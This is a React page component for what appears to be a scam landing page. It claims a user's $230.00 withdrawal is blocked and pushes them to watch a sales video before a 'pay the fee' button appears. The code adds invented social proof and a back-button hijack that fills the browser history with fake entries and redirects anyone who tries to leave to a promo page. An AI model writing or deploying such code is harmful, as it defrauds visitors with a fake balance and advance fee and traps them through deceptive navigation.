import Button from "@/components/button";
import Comments from "@/components/comments";
import VSLBlackKim from "@/components/videos/vsl-black-kim";
import { useLayer } from '@/context/layer-provider';
import { useEffect, useState } from 'react';
import { CheckCheck, Loader2, Lock } from 'lucide-react';

export default function Page({
  active,
  handleClick,
}:{
  active: boolean,
  handleClick: () => void,
}) {

  // COMPONENT STATES
  const [visible, setVisible] = useState<boolean>(false);

  // IMPORT CONTEXT DATA
  const userLayerData = useLayer();

  // USER LAYER DATA
  const userHost = userLayerData.host;
  const userFrontLink = userLayerData.frontLink;

  // SET CONTENT DATA
  const VSL = VSLBlackKim;
  const videoId = "68a77525bbcb512da47ca857";
  const backLink = `https://${userHost}/promo`;
  const pitchTime = 630;

  // VIDEO VERIFY
  useEffect(() => {
    if (!visible) {
      const intervalId = setInterval(() => {
        const storedVideoTime = Number(localStorage.getItem(videoId + '-resume'));
        if (storedVideoTime > pitchTime) {
          setVisible(true);
        };
      }, 1000);
      return () => clearInterval(intervalId);
    };
  }, [videoId, visible]);

  // BACK REDIRECT
  useEffect(() => {
    function setBackRedirect(url: string) {
      let urlBackRedirect = url;
      urlBackRedirect =
        urlBackRedirect.trim() +
        (urlBackRedirect.indexOf('?') > 0 ? '&' : '?') +
        document.location.search.replace('?', '').toString();
      history.pushState({}, '', location.href);
      history.pushState({}, '', location.href);
      history.pushState({}, '', location.href);
      window.addEventListener('popstate', () => {
        console.log('onpopstate', urlBackRedirect);
        setTimeout(() => {
          location.href = urlBackRedirect;
        }, 1);
      });
    };

    setBackRedirect(backLink);
  }, [backLink]);

  return (
    <>
      <div className="appear w-full max-w-md bg-white rounded-3xl shadow-[0_8px_30px_rgb(0,0,0,0.08)] p-5 sm:p-6 text-center border border-gray-100 relative overflow-hidden mb-6">
        <div className="flex items-center justify-center gap-2 mb-4">
          <div className="bg-red-50 text-red-600 p-1.5 rounded-full">
            <Lock size={14} strokeWidth={2.5} />
          </div>
          <span className="text-sm font-bold text-gray-800 uppercase tracking-wide">
            Withdrawal Bloqued
          </span>
        </div>
        <h1 className="text-xl sm:text-2xl font-bold text-gray-800 mb-2 leading-tight">
          Unlock your Balance
        </h1>
        <p className="text-gray-500 text-xs sm:text-sm mb-5 px-2">
          Watch the short video below to learn how to transfer the{" "}
          <strong className="text-green-600">$230.00</strong>{" "}
          to your account immediately.
        </p>
        <VSL />
        <div className="mt-6 rounded-2xl border border-[#d6dbe3] bg-[#f6f7f9] px-6 py-5">
          <p className="text-[15px] leading-relaxed text-[#4f627d]">
            <strong className="text-[#1a2942]">Important:</strong> Thousands of users have already withdrawn.
            Follow the instructions in the video to avoid errors in bank transfer.
          </p>
        </div>
        {visible && (
          <a href={userFrontLink} className="mt-5 block">
            <Button
              onClick={handleClick}
              disabled={active}
              className="pulse !rounded-2xl !border-b-0 !px-6 !py-4 !bg-green-500 hover:!bg-green-600"
            >
              {active ? (
                <Loader2 className="size-5 animate-spin" />
              ):(
                <CheckCheck className="size-5" />
              )}
              <span>I WANNA PAY THE FEE!</span>
            </Button>
          </a>
        )}
      </div>
      {!visible && (
        <div className="text-sm text-center p-2">
          🔊 Check if your sound is turned on
        </div>
      )}
      <Comments />
    </>
  );
  
};